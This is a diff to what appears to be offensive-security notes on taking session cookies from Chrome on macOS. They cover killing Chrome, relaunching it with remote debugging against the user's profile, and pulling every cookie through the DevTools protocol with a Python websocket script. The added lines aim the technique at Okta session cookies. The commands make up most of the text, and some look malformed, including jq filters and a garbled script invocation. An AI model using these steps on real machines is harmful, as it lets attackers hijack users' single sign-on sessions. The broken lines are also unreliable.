@@ -20,7 +20,7 @@ To dump localStorage:
 Google Chrome (macOS) cookies are stored in an encrypted SQLite database with the key saved in the keychain. Unencrypted cookies can still be fetched by attaching a remote chrome debugger. This technique requires existing Chrome browsers to be restarted with the `--remote-debugging-port` flag. 
 
 * `killall Google\ Chrome`
-* `/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --remote-debugging-port=9222 --user-data-dir="/Users/<user>/Library/Application Support/Google/Chrome" --restore-last-session`
+* `/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --remote-allow-origins="*" --remote-debugging-port=9222 --user-data-dir="/Users/<user>/Library/Application Support/Google/Chrome" --restore-last-session --profile-directory=Default`
 
 The following `/json` endpoint provides a list of websocket addresses. 
 * `curl http://localhost:9222/json`
@@ -38,8 +38,8 @@ ws.connect("ws://localhost:9222/devtools/page/<id>", suppress_origin=True)
 ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
 print(ws.recv())
 ```
-
-* `python3 rip ripWCMN.py  | jq -c '.result.cookies[].name="idx"'`
+* `python3 rip ripWCMN.py  | jq -r '.[] | select(.url="https://<subdomain>.okta.com/app/UserHome")'`
+* `python3 rip ripWCMN.py  | jq -c '.result.cookies[] | select(.name="idx")'`
 
 Credit: Justin Bui and @mangopdf
 
